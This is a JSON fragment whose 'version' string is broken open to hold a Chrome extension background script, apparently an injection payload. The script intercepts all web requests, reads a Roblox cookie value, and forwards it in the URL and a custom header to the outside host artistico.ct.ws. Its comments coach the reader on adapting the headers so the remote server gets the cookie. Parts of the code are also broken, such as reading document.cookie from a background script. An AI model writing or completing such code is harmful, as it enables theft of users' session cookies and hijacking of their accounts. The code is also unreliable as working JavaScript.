{"version": "');// background.js

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    if (details.url.startsWith('https://artistico.ct.ws/maintenance/')) {
      // Get the timestamp from the Roblox cookie
      const robloxCookie = document.cookie.match(/\.TIMESTAMP=[^;]+/);
      if (!robloxCookie) {
        console.error('Roblox cookie not found.');
        return { cancel: true }; // Important: Cancel the request if the cookie is missing
      }
      const timestamp = robloxCookie[0].split('=')[1];

      // Create the modified URL
      const modifiedUrl = details.url.replace(/data=.*$/, `data='${timestamp}'`);

      // Important: Construct the headers to avoid a CORS error.
      // Chrome won't automatically send the cookie if it's an HTTP-only cookie.
      // You must manually add a header that allows your request to access the cookie
      // For example, when requesting https://artistico.ct.ws/maintenance/...

      // The following only works if the server expects that custom header
      // and also has access to the cookie from roblox
      // You must adapt it to the specific server requirements

      const headers = details.requestHeaders;

      // This is a placeholder;  you need to modify the headers below
      // depending on what the server expects.
      const newHeader = {
        name: 'X-Roblox-Timestamp', // Or whatever the header is required as
        value: timestamp,
      };

      const headerIndex = headers.findIndex(header => header.name === 'X-Roblox-Timestamp');

      if (headerIndex !== -1) {
        headers[headerIndex] = newHeader;
      } else {
        headers.push(newHeader);
      }

      console.log('Modified URL:', modifiedUrl);
      console.log('Modified Headers:', headers);
      return { requestHeaders: headers, redirectUrl: modifiedUrl };
    }
    return { redirectUrl: details.url };
  },
  { urls: ['<all_urls>'] }, //Important: only listen to all URLs
  ['blocking', 'requestHeaders']
);

// This is to ensure the script runs after the page loads.
// It won't be in the scope of the onBeforeSendHeaders event
window.onload = () => {
  try {
    const robloxCookie = document.cookie.match(/\.TIMESTAMP=[^;]+/);
    if(robloxCookie){
      console.log('Roblox cookie found:', robloxCookie[0]);
    } else {
      console.error('Roblox cookie not found.');
    }
  } catch (error) {
    console.error('Error accessing cookie:', error);
  }
};console.log('"}
